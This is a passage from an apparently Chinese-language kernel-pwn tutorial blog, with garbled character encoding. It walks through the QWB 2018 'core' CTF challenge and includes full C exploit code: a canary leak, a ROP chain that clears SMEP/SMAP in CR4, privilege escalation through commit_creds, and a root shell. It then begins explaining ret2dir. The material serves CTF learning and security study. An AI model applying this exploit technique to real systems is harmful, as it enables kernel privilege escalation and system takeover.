class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    <span class="hljs-keyword">size_t</span> canary;<br>    setOffValue(fd, <span class="hljs-number">64</span>);<br>    coreRead(fd, buf);<br>    canary = ((<span class="hljs-keyword">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-keyword">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootPrivilige;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ + offset;<br>    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootShell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>é‡æ–°æ‰“åŒ…ï¼Œè¿è¡Œï¼ŒæˆåŠŸè·å–rootæƒé™</p><p><a href="https://i.loli.net/2021/03/10/ZJr5aWSmlBM8AXt.png"><img src="https://s2.loli.net/2023/02/06/pYjz5q6hc9THVJk.png" alt="image.png"></a></p><h2 id="ret2usr-with-SMAP-SMEP-BYPASS"><a href="#ret2usr-with-SMAP-SMEP-BYPASS" class="headerlink" title="ret2usr with SMAP/SMEP BYPASS"></a>ret2usr with SMAP/SMEP BYPASS</h2><p>å‰é¢æˆ‘ä»¬è®²åˆ°ï¼Œå½“ kernel å¼€å¯ SMEP ä¿æŠ¤æ—¶ï¼Œret2usr è¿™ç§æ”»å‡»æ‰‹æ³•å°†ä¼šå¼•èµ· kernel panicï¼Œå› æ­¤è‹¥æ˜¯æˆ‘ä»¬ä»ç„¶æƒ³è¦è¿›è¡Œ ret2usr æ”»å‡»ï¼Œåˆ™éœ€è¦å…ˆå…³é—­ SMEP ä¿æŠ¤</p><p>Intel ä¸‹ç³»ç»Ÿæ ¹æ® CR4 æ§åˆ¶å¯„å­˜å™¨çš„ç¬¬ 20ã€21 ä½æ ‡è¯†æ˜¯å¦å¼€å¯ SMEPã€SMAP ä¿æŠ¤ï¼ˆ1ä¸ºå¼€å¯ï¼Œ0ä¸ºå…³é—­ï¼‰ï¼Œ<strong>è‹¥æ˜¯èƒ½å¤Ÿæ”¹å˜ CR4 å¯„å­˜å™¨çš„å€¼ä¾¿èƒ½å¤Ÿå…³é—­ SMEP/SMAP ä¿æŠ¤</strong>ï¼Œå®Œæˆ SMAP/SMEP-bypassï¼Œæ¥ä¸‹æ¥å°±èƒ½å¤Ÿé‡æ–°è¿›è¡Œ ret2usr</p><p><a href="https://i.loli.net/2021/09/07/sYFKuZiUVNIclBp.png"><img src="https://s2.loli.net/2023/02/06/4s1trBAdPvn2G6T.png" alt="image.png"></a></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹CPUç›¸å…³ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬å¼€å¯çš„ä¿æŠ¤ç±»å‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> cat /proc/cpuinfo</span><br></code></pre></div></td></tr></table></figure><h3 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core-2"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core-2" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core</h3><blockquote><p><del>åˆæ˜¯ coreï¼å…¸ä¸­å…¸çš„ kernel pwn å…¥é—¨é¢˜ï¼</del></p></blockquote><p>è¿™ä¸€æ¬¡æˆ‘ä»¬åœ¨å¯åŠ¨è„šæœ¬ä¸­æ·»åŠ ä¸Š smep ä¸ smap çš„é€‰é¡¹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SH">qemu-system-x86_64 \<br>-m 128M \<br>-cpu qemu64-v1,+smep,+smap \<br>-kernel ./bzImage \<br>-initrd  ./rootfs.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>-s  \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></div></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬é‡æ–°è¿è¡Œä¹‹å‰çš„ ret2usr çš„ expï¼Œå‘ç°ç›´æ¥ kernel panic äº†ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„å‡½æ•°æŒ‡é’ˆï¼Œè§¦å‘äº† SMEP ä¿æŠ¤</p><p><a href="https://s2.loli.net/2022/05/07/f2MXaqwC7kgRx8G.png"><img src="https://s2.loli.net/2023/02/06/gnSDeomsQIaMUNd.png" alt="image.png"></a></p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡ ROP æ¥å…³é—­ SMEP&amp;SMAP å³å¯ç»§ç»­ ret2usrï¼Œè¿™é‡Œç¬”è€…ç”¨ä¸è¿ç®—å°† SMEP ä¸ SMAP çš„ä¸¤ä½ç»™æ¸…é™¤æ‰äº†ï¼Œå®é™…ä¸Šç›´æ¥ç»™ cr4 èµ‹å€¼ <code>0x6f0</code> ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ˆé€šå¸¸å…³äº†ä»¥åéƒ½æ˜¯è¿™ä¸ªå€¼ï¼‰</p><p>å‰é¢æˆ‘ä»¬ä½¿ç”¨ swapgs å’Œ iret ä¸¤æ¡æŒ‡ä»¤æ¥è¿”å›ç”¨æˆ·æ€ï¼Œè¿™ä¸€æ¬¡æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ <code>swapgs_restore_regs_and_return_to_usermode</code> æ¥è¿”å›ç”¨æˆ·æ€</p><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RAX_RET 0xffffffff810520cf</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET 0xffffffff8106669c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AND_RAX_RDI_RET 0xffffffff8102b45b</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PUSHFQ_POP_RBX_RET 0xffffffff81131da4</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IRETQ 0xffffffff813eb448</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008da</span><br><br><span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-keyword">void</span> *);<br><span class="hljs-keyword">int</span> (*commit_creds_ptr)(<span class="hljs-keyword">void</span> *);<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreRead</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setOffValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> off)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> nbytes)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds_ptr = commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred_ptr = prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    <span class="hljs-keyword">size_t</span> canary;<br>    setOffValue(fd, <span class="hljs-number">64</span>);<br>    coreRead(fd, buf);<br>    canary = ((<span class="hljs-keyword">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-keyword">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)<br>        rop_chain[i] = canary;<br><br>    rop_chain[i++] = MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET + offset;<br>    rop_chain[i++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>    rop_chain[i++] = AND_RAX_RDI_RET + offset;<br>    rop_chain[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootPrivilige;<br>    rop_chain[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span> + offset;<br>    rop_chain[i++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootShell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒ</p><p><a href="https://s2.loli.net/2022/05/07/YE5fAK7rQRhcpXG.png"><img src="https://s2.loli.net/2022/05/07/YE5fAK7rQRhcpXG.png" alt="image.png"></a></p><blockquote><p>è¿™é‡Œç¬”è€…é€‰æ‹©çš„ CPU å‹å· <code>qemu64-v1</code> å…¶å®æ˜¯åœ¨æˆ‘ä»¬ä¸æŒ‡å®šæ—¶ QEMU é»˜è®¤ä½¿ç”¨çš„ CPU å‹å·ï¼Œä½†æ˜¯ä½ å¯ä»¥çœ‹åˆ°ä¸€èˆ¬çš„æ¯”èµ›ä½¿ç”¨çš„éƒ½æ˜¯ <code>kvm64</code> è¿™ä¸€å‹å·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ QEMU å¯ç”¨çš„ CPU å‹å·åŠè¯´æ˜</p><figure class="highlight node-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs node-repl">$ qemu-system-x86_64 -cpu help<br>Available CPUs:<br><span class="hljs-meta">...</span><br>x86 kvm64                 (alias configured by machine type)<br><span class="hljs-meta">...</span><br>x86 qemu64-v1             QEMU Virtual CPU version 2.5+<br><span class="hljs-meta">...</span><br><br>SH<br></code></pre></div></td></tr></table></figure><p>å› æ­¤å¤§å®¶é»˜è®¤ä¼šä½¿ç”¨ <code>kvm64</code> è¿™ä¸€å‹å·ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿™é‡Œç¬”è€…è¦ç‰¹æ„æŒ‡å®šæˆ <code>qemu64-v1</code> å‘¢ï¼Œè¿™æ˜¯å› ä¸ºç¬”è€…å‘ç°å…¶ä»–å‹å·çš„ CPU <strong>åœ¨å…³é—­ smepã€smap åä»æ— æ³•æ­£å¸¸åœ° ret2usr</strong>ï¼Œä¼šåœ¨è®¿é—®ç”¨æˆ·ç©ºé—´æ—¶è§¦å‘ç¼ºé¡µå¼‚å¸¸</p><p><a href="https://s2.loli.net/2022/05/07/DNvQq6WlsUm9zFa.png"><img src="https://s2.loli.net/2022/05/07/DNvQq6WlsUm9zFa.png" alt="image.png"></a></p><p>é€ æˆè¿™ç§ç°è±¡çš„åŸå› æ˜¯å› ä¸º<strong>KPTI æœºåˆ¶ï¼Œå¯¹äºå¼€å¯äº† KPTI çš„å†…æ ¸è€Œè¨€ï¼Œå†…æ ¸é¡µè¡¨çš„ç”¨æˆ·åœ°å€ç©ºé—´æ— æ‰§è¡Œæƒé™</strong>ï¼Œå› æ­¤å½“å†…æ ¸å°è¯•æ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç æ—¶ï¼Œç”±äºå¯¹åº”é¡µé¡¶çº§è¡¨é¡¹æ²¡æœ‰è®¾ç½®å¯æ‰§è¡Œä½ï¼Œå› æ­¤ä¼šç›´æ¥ panic</p><p>kpti åœ¨ <code>qemu64-v1</code> ä¸Šé»˜è®¤æ˜¯å…³é—­çš„ï¼Œä½†åœ¨å…¶ä»–å‹å· CPU ä¸Šé»˜è®¤æ˜¯å¼€å¯çš„ï¼Œæ‰€ä»¥è¿™é‡Œç¬”è€…é€‰ç”¨è¯¥å‹å·æ¥ä½œä¸ºä¿®æ”¹ cr4 è¿›è¡Œ smep/smap bypass çš„ä¾‹é¢˜ï¼Œ<strong>ä½†å®é™…ä¸Š ret2usr å·²ç»æ˜¯è¿‡å»å¼äº†</strong></p></blockquote><h1 id="Kernel-ROP-ret2dir"><a href="#Kernel-ROP-ret2dir" class="headerlink" title="Kernel ROP - ret2dir"></a>Kernel ROP - ret2dir</h1><blockquote><p><del>ç¬”è€…ç¬¬ä¸€æ¬¡è§è¿™ä¸ªåå­—çš„æ—¶å€™è¿˜ä»¥ä¸ºæ˜¯ return to directoryï¼šè¿”å›è‡³æ–‡ä»¶å¤¹çš„æ”»å‡»ï¼Œä½†ç°åœ¨ä»”ç»†æƒ³æ¥è‡³å°‘è‹±æ–‡çŒœçš„å·®ä¸å¤šå¯¹</del>ï¼ˆ</p></blockquote><p>ret2dir æ˜¯å“¥ä¼¦æ¯”äºšå¤§å­¦ç½‘ç»œå®‰å…¨å®éªŒå®¤åœ¨ 2014 å¹´æå‡ºçš„ä¸€ç§è¾…åŠ©æ”»å‡»æ‰‹æ³•ï¼Œä¸»è¦ç”¨æ¥<strong>ç»•è¿‡ smepã€smapã€pxn ç­‰ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´éš”ç¦»çš„é˜²æŠ¤æ‰‹æ®µ</strong>ï¼ŒåŸè®ºæ–‡è§æ­¤å¤„<a href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf">http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf</a></p><p>æˆ‘ä»¬é¦–å…ˆæ¥æ€è€ƒä¸€ä¸‹ <a href="https://elixir.bootlin.com/linux/latest/source/Documentation/x86/x86_64/mm.rst">x86 ä¸‹çš„ Linux kernel çš„å†…å­˜å¸ƒå±€</a>ï¼Œå­˜åœ¨ç€è¿™æ ·çš„ä¸€å—åŒºåŸŸå«åš <code>direct mapping area</code>ï¼Œå³å†…æ ¸çš„ <code>çº¿æ€§æ˜ å°„åŒº</code>ï¼Œ<strong>çº¿æ€§åœ°ç›´æ¥æ˜ å°„äº†æ•´ä¸ªç‰©ç†å†…å­˜ç©ºé—´</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs RST">ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)<br></code></pre></div></td></tr></table></figure><blockquote><p>å¥½åƒä¹Ÿæ²¡æœ‰å•¥è¯‘åï¼Œä½†æ˜¯å«ç›´æ¥æ˜ å°„åŒºå¤ªéš¾å¬ï¼Œå› ä¸ºè¿™å—æ˜ å°„æ˜¯çº¿æ€§çš„ï¼ˆlinearï¼‰ï¼Œç¬”è€…å°±ä¸€ç›´å«ä»–çº¿æ€§æ˜ å°„åŒº</p><blockquote><p>åœ¨ 32 ä½ä¸‹è¿™å—åŒºåŸŸä¼¼ä¹åªèƒ½å  896 MBï¼Œè™½ç„¶ 32 ä½ä¸‹æœ‰æœ€å¤§ 4G çš„å†…å­˜ç©ºé—´ï¼Œä¸è¿‡è™½ç„¶åŒæ ·æ˜¯çº¿æ€§æ˜ å°„åŒºï¼Œ 32 ä½å’Œ 64 ä½çš„å†…å­˜å¸ƒå±€è¿˜æ˜¯æœ‰äº›è®¸ä¸åŒçš„ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦è¿˜æ˜¯å…³æ³¨ 64 ä½</p></blockquote><p>ç¬”è€…çŒœæµ‹ï¼šbuddy system åº”å½“æ˜¯é€šè¿‡è¿™å—æ˜ å°„æ¥ç®¡ç†æ•´ä¸ªç‰©ç†å†…å­˜ç©ºé—´çš„ï¼Œå°šæœªæŸ¥è¯è¿‡æºç </p><p>è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡º Linux åœ¨ 4çº§é¡µè¡¨ï¼ˆåœ°å€é•¿åº¦ 48 bitï¼‰ä¸‹çš„æœ€å¤§å†…å­˜åº”å½“ä¸º 64 TB è€Œå¹¶é 256 